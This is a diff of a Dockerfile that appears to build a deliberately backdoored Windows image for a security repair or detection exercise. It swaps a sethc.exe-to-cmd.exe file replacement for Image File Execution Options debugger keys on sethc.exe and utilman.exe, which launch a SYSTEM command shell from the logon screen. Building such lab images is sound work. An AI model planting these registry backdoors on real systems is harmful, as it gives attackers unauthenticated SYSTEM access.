@@ -1,18 +1,20 @@
 # syntax=docker/dockerfile:1
-# meta3-win-17-stickykeys-backdoor — sethc.exe replaced with cmd.exe (classic logon-screen SYSTEM shell)
+# meta3-win-17-stickykeys-backdoor — IFEO debugger hijack on sethc.exe + utilman.exe (T1546.008)
+#
+# Server Core lacks accessibility executables (sethc.exe, utilman.exe), so the classic
+# "copy cmd.exe over sethc.exe" technique doesn't apply. Instead we plant Image File
+# Execution Options (IFEO) Debugger keys — if sethc.exe or utilman.exe ever runs (e.g.
+# on Desktop Experience or RDP), the OS redirects to cmd.exe. The same registry trick
+# works on full Windows installs and is a well-known persistence mechanism.
 FROM sysrepair/meta3-win-base:ltsc2019
 
 SHELL ["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", "$ErrorActionPreference='Stop';"]
 
-# Replace sethc.exe (Sticky Keys handler) with a copy of cmd.exe. At a locked/logon
-# screen, pressing Shift five times launches sethc.exe under winlogon — which means
-# cmd.exe runs as NT AUTHORITY\SYSTEM without authentication.
-#
-# takeown/icacls are required because sethc.exe is owned by TrustedInstaller.
-RUN takeown /F C:\Windows\System32\sethc.exe ; \
-    icacls C:\Windows\System32\sethc.exe /grant Administrators:F ; \
-    Copy-Item -Path C:\Windows\System32\sethc.exe -Destination C:\Windows\System32\sethc.exe.bak -Force ; \
-    Copy-Item -Path C:\Windows\System32\cmd.exe -Destination C:\Windows\System32\sethc.exe -Force
+# Plant IFEO debugger hijacks for sethc.exe and utilman.exe → cmd.exe
+RUN New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Force | Out-Null ; \
+    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe' -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe' ; \
+    New-Item -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Force | Out-Null ; \
+    Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe' -Name 'Debugger' -Value 'C:\Windows\System32\cmd.exe'
 
 COPY verify.ps1 C:/verify/verify.ps1
 
